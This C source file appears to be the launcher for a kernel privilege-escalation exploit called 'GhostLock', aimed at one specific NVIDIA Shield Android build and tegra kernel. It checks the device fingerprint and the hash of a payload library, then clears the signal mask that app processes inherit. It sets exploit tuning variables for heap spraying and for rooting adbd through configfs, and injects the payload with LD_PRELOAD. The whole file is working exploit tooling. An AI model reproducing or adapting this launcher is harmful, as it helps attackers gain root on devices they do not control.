#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/file.h>
#include <sys/stat.h>
#include <sys/system_properties.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <time.h>
#include <unistd.h>

#define EXPECTED_FINGERPRINT \
  "NVIDIA/mdarcy/mdarcy:11/RQ1A.210105.003/7825230_4387.0822:user/release-keys"
#define EXPECTED_KERNEL "4.9.141-tegra-gb6e5605a"
#define EXPECTED_PAYLOAD_SHA256 \
  "a3a1e75b627d8dd419e9bafd2a73082a8647510bf6ce4f975e52baf5aa1d0761"
#define COOLDOWN_SECONDS 900

static int log_fd = -1;

static void log_line(const char *format, ...) {
  char message[1024];
  va_list args;
  va_start(args, format);
  int length = vsnprintf(message, sizeof(message), format, args);
  va_end(args);
  if (length < 0) {
    return;
  }

  size_t count = (size_t)length;
  if (count >= sizeof(message)) {
    count = sizeof(message) - 1;
  }
  if (log_fd >= 0) {
    dprintf(log_fd, "%ld %.*s\n", (long)time(NULL), (int)count, message);
    fsync(log_fd);
  }
}

static bool parse_nonnegative(const char *value, long *result) {
  if (!value || !*value) {
    return false;
  }
  errno = 0;
  char *end = NULL;
  long parsed = strtol(value, &end, 10);
  if (errno != 0 || !end || *end != '\0' || parsed < 0) {
    return false;
  }
  *result = parsed;
  return true;
}

static bool property_value(const char *name, char *value, size_t value_size) {
  char buffer[PROP_VALUE_MAX] = {0};
  int length = __system_property_get(name, buffer);
  if (length <= 0 || (size_t)length >= value_size) {
    return false;
  }
  memcpy(value, buffer, (size_t)length + 1);
  return true;
}

static void log_process_status(void) {
  FILE *status = fopen("/proc/self/status", "re");
  if (!status) {
    return;
  }
  char line[256];
  while (fgets(line, sizeof(line), status)) {
    if (strncmp(line, "Uid:", 4) == 0 || strncmp(line, "Gid:", 4) == 0 ||
        strncmp(line, "Groups:", 7) == 0 ||
        strncmp(line, "Seccomp:", 8) == 0) {
      line[strcspn(line, "\r\n")] = '\0';
      log_line("%s", line);
    }
  }
  fclose(status);

  char context[128] = {0};
  int fd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t count = read(fd, context, sizeof(context) - 1);
    close(fd);
    if (count > 0) {
      context[count] = '\0';
      context[strcspn(context, "\r\n")] = '\0';
      log_line("context=%s", context);
    }
  }
}

static bool payload_hash_matches(const char *payload) {
  char command[PATH_MAX + 64];
  int length = snprintf(command, sizeof(command),
                        "/system/bin/sha256sum %s", payload);
  if (length <= 0 || (size_t)length >= sizeof(command)) {
    return false;
  }

  FILE *pipe = popen(command, "r");
  if (!pipe) {
    return false;
  }
  char actual[65] = {0};
  bool read_ok = fscanf(pipe, "%64[0-9a-f]", actual) == 1;
  int status = pclose(pipe);
  return read_ok && status == 0 &&
         strcmp(actual, EXPECTED_PAYLOAD_SHA256) == 0;
}

static void read_state(const char *path, long *boot_count, long *last_attempt) {
  *boot_count = -1;
  *last_attempt = 0;
  FILE *state = fopen(path, "re");
  if (!state) {
    return;
  }

  char line[128];
  while (fgets(line, sizeof(line), state)) {
    long value = 0;
    if (sscanf(line, "boot_count=%ld", &value) == 1 && value >= 0) {
      *boot_count = value;
    } else if (sscanf(line, "last_attempt_epoch=%ld", &value) == 1 &&
               value >= 0) {
      *last_attempt = value;
    }
  }
  fclose(state);
}

static bool write_state(const char *path, long boot_count, long last_attempt) {
  char temporary[PATH_MAX];
  int length = snprintf(temporary, sizeof(temporary), "%s.tmp.%d", path,
                        getpid());
  if (length <= 0 || (size_t)length >= sizeof(temporary)) {
    return false;
  }

  int fd = open(temporary, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  if (fd < 0) {
    return false;
  }
  bool ok = dprintf(fd, "boot_count=%ld\nlast_attempt_epoch=%ld\n",
                    boot_count, last_attempt) > 0 &&
            fsync(fd) == 0 && close(fd) == 0 && rename(temporary, path) == 0;
  if (!ok) {
    close(fd);
    unlink(temporary);
  }
  return ok;
}

static bool executable_directory(char *directory, size_t directory_size) {
  char executable[PATH_MAX];
  ssize_t count = readlink("/proc/self/exe", executable, sizeof(executable) - 1);
  if (count <= 0 || (size_t)count >= sizeof(executable)) {
    return false;
  }
  executable[count] = '\0';
  char *slash = strrchr(executable, '/');
  if (!slash) {
    return false;
  }
  *slash = '\0';
  int length = snprintf(directory, directory_size, "%s", executable);
  return length > 0 && (size_t)length < directory_size;
}

int main(int argc, char **argv) {
  umask(077);
  if (argc != 3) {
    return 64;
  }

  const char *files_directory = argv[2];
  (void)mkdir(files_directory, 0700);

  char log_path[PATH_MAX];
  char state_path[PATH_MAX];
  char lock_path[PATH_MAX];
  char disabled_path[PATH_MAX];
  if (snprintf(log_path, sizeof(log_path), "%s/boot.log", files_directory) <= 0 ||
      snprintf(state_path, sizeof(state_path), "%s/watchdog.state",
               files_directory) <= 0 ||
      snprintf(lock_path, sizeof(lock_path), "%s/watchdog.lock",
               files_directory) <= 0 ||
      snprintf(disabled_path, sizeof(disabled_path), "%s/DISABLED",
               files_directory) <= 0) {
    return 65;
  }

  log_fd = open(log_path, O_WRONLY | O_CREAT | O_APPEND, 0600);
  if (log_fd >= 0) {
    (void)dup2(log_fd, STDOUT_FILENO);
    (void)dup2(log_fd, STDERR_FILENO);
  }
  log_line("runner started pid=%d uid=%d gid=%d boot_count_arg=%s", getpid(),
           getuid(), getgid(), argv[1]);
  log_process_status();

  if (access(disabled_path, F_OK) == 0) {
    log_line("disabled marker present; exiting");
    return 0;
  }
  if (getuid() == 0) {
    log_line("refusing privileged trigger");
    return 77;
  }

  long boot_count = -1;
  if (!parse_nonnegative(argv[1], &boot_count)) {
    log_line("invalid Android boot count: %s", argv[1]);
    return 66;
  }

  int lock_fd = open(lock_path, O_WRONLY | O_CREAT, 0600);
  if (lock_fd < 0 || flock(lock_fd, LOCK_EX | LOCK_NB) != 0) {
    log_line("another runner holds the boot lock");
    return 0;
  }

  long saved_boot_count = -1;
  long last_attempt = 0;
  read_state(state_path, &saved_boot_count, &last_attempt);
  if (saved_boot_count == boot_count) {
    log_line("attempt already recorded for boot_count=%ld", boot_count);
    return 0;
  }

  char fingerprint[PROP_VALUE_MAX] = "unavailable";
  struct utsname uts = {0};
  bool have_fingerprint = property_value("ro.build.fingerprint", fingerprint,
                                         sizeof(fingerprint));
  bool have_uname = uname(&uts) == 0;
  if (!have_fingerprint || strcmp(fingerprint, EXPECTED_FINGERPRINT) != 0 ||
      !have_uname || strcmp(uts.release, EXPECTED_KERNEL) != 0) {
    log_line("target mismatch fingerprint=%s kernel=%s", fingerprint,
             have_uname ? uts.release : "unavailable");
    return 67;
  }

  time_t now = time(NULL);
  time_t ready_at = (time_t)last_attempt + COOLDOWN_SECONDS;
  if (now < ready_at) {
    unsigned int remaining = (unsigned int)(ready_at - now);
    log_line("cooldown active; waiting %u seconds", remaining);
    while (remaining > 0) {
      unsigned int interval = remaining > 30 ? 30 : remaining;
      sleep(interval);
      now = time(NULL);
      remaining = now < ready_at ? (unsigned int)(ready_at - now) : 0;
    }
  }

  char library_directory[PATH_MAX] = "unavailable";
  char payload[PATH_MAX] = "unavailable";
  int payload_length = -1;
  if (!executable_directory(library_directory, sizeof(library_directory)) ||
      (payload_length = snprintf(payload, sizeof(payload), "%s/libghostlock.so",
                                 library_directory)) <= 0 ||
      (size_t)payload_length >= sizeof(payload) ||
      !payload_hash_matches(payload)) {
    log_line("payload path or hash validation failed: %s", payload);
    return 69;
  }

  now = time(NULL);
  if (!write_state(state_path, boot_count, (long)now)) {
    log_line("could not persist pre-trigger state");
    return 70;
  }

  /* ART blocks several signals on app process threads, including SIGUSR1.
   * The GhostLock waiter uses a targeted SIGUSR1 to leave its futex wait, and
   * an exec preserves the caller's signal mask. Restore the empty mask that a
   * normal ADB shell supplies before entering the payload. */
  sigset_t empty_mask;
  if (sigemptyset(&empty_mask) != 0 ||
      sigprocmask(SIG_SETMASK, &empty_mask, NULL) != 0) {
    log_line("could not clear inherited signal mask errno=%d (%s)", errno,
             strerror(errno));
    return 72;
  }
  log_line("cleared inherited ART signal mask");

  setenv("GHOSTLOCK_FIXED_BASE", "1", 1);
  setenv("GHOSTLOCK_MAIN_ROUTE", "slide-mcast", 1);
  setenv("GHOSTLOCK_SLIDE_FULL_LOCK", "1", 1);
  setenv("GHOSTLOCK_MIXED_ORDER_PAYLOAD", "1", 1);
  setenv("GHOSTLOCK_MM_PARTIALS", "14", 1);
  setenv("GHOSTLOCK_BUDDY_HOLD_PAIRS", "256", 1);
  setenv("GHOSTLOCK_BUDDY_HOLD_SENDS", "8192", 1);
  setenv("GHOSTLOCK_RECLAIM_PAIRS", "64", 1);
  setenv("GHOSTLOCK_RECLAIM_SENDS", "2048", 1);
  setenv("GHOSTLOCK_ADBD_ROOT_CONFIGFS", "1", 1);
  unsetenv("GHOSTLOCK_ADBD_PID");
  setenv("LD_PRELOAD", payload, 1);

  log_line("starting GhostLock boot attempt boot_count=%ld target=adbd-comm-scan",
           boot_count);
  execl("/system/bin/true", "true", (char *)NULL);
  log_line("exec failed errno=%d (%s)", errno, strerror(errno));
  return 71;
}
